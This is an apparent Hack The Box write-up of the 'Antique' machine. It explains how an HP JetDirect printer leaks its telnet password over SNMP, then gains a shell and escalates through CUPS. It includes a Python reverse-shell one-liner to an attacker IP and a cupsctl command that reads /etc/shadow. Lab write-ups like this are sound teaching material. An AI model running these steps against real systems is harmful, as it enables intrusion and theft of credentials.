@@ -1,0 +1,106 @@
+Antique
+
+ 13th May 2021 / Document No D21.101.179
+ Prepared By: MrR3boot
+ Machine Author(s): MrR3boot
+ Difficulty: Easy
+ Classification: Official
+Synopsis
+
+Antique is an easy Linux machine featuring a network printer disclosing credentials through SNMP string
+which allows logging into telnet service. Foothold can be obtained by exploiting a feature in printer. CUPS
+administration service running locally. This service can be exploited further to gain root access on the
+server.
+
+Skills Required
+
+      Basic Linux Knowledge
+      Basic Printers Knowledge
+
+Skills Learned
+
+      SNMP Enumeration
+      Network Printer Abuse
+      Local Pivoting/Proxy Setup
+      CUPS Administration exploitation
+Enumeration
+
+Nmap
+
+Let's start with port scan.
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.251 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sV -sC 10.10.10.251
+
+Nmap scan reveals that the target server has telnet service running. Let's scan UDP ports.
+   ports=$(sudo nmap -p- --min-rate=1000 -T4 10.10.10.251 -sU | grep ^[0-9] | cut -d '/' -
+   f 1 | tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -sV -sC 10.10.10.251
+
+We see SNMP port is open and nmap reports that it supports community string public .
+
+SNMP
+
+Let's enumerate SNMP service using snmpwalk tool.
+   snmpwalk -v 2c -c public 10.10.10.251
+SNMP string responds with HTB Printer . We couldn't find much information using snmpwalk. Let's
+connect to telnet service.
+
+Telnet
+
+Telnet service require a password and it says HP JetDirect. Searching online about HP JetDirect and
+passwords we find a blogpost which explains a vulnerability that is disclosing password through SNMP
+string. Let's enumerate the password using .1.3.6.1.4.1.11.2.3.9.1.1.13.0 MIB.
+
+   snmpwalk -v 2c -c public 10.10.10.251 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
+Foothold
+
+Decoding the hex values reveals the password.
+   import binascii
+   s='50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30
+   31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103
+   106 111 114 115 11 9 122 123 126 130 131 134 135'
+   binascii.unhexlify(s.replace(' ',''))
+
+Let's input the password P@ssw0rd@123!!123 in telnet prompt.
+
+We are now authenticated. Sending ? shows usage instructions.
+We can configure printer using this telnet session. Let's try to update host-name .
+
+The configuration is not updating. We can execute system commands using exec option. Let's execute id
+command and see if its functioning.
+
+We see that this service is running as lp user who's member of lpadmin group. From this reference we
+see that these groups are used to manage printers.
+      lp (LP): Members of this group can enable and use printers. (The user lp is not used anymore.)
+      lpadmin (LPADMIN): Allows members to manage printers and pending jobs sent by other users.
+Standup a listener on port 1234 and issue below command to obtain reverse shell.
+   exec python3 -c 'import
+   socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.
+   10.14.4",1234));os.dup2(s.fileno(),0);
+   os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+This is successful and we receive shell as lp user.
+Privilege Escalation
+
+Having foothold on the server, we start exploring the services that are running on the server.
+
+There's a service running locally on port 631. This port is used by Internet Printing Protocol by default. Let's
+install chisel to do port forwarding.
+
+   git clone https://github.com/jpillora/chisel
+   cd chisel && go build -ldflags="-s -w"
+   sudo ./chisel server -p 8000 --reverse
+Copy chisel to the server and issue below command on reverse shell session to do a port forward.
+
+Browsing to 127.0.0.1:631 on our machine shows CUPS administration page.
+CUPS versions less than 1.6.2 has a known local file read vulnerability. Navigate to Administration .
+
+Clicking on View Error Log shows the contents of error.log file. As CUPS server runs as root by default,
+arbitraty file read can be achieved by updating ErrorLog file path. Let's update the ErrorLog path using
+cupsctl .
+
+   cupsctl ErrorLog="/etc/shadow"
+Now sending a cURL request to View Error Log reveals the contents of /etc/shadow file.
+Contents of root.txt can be read in similar way.
+
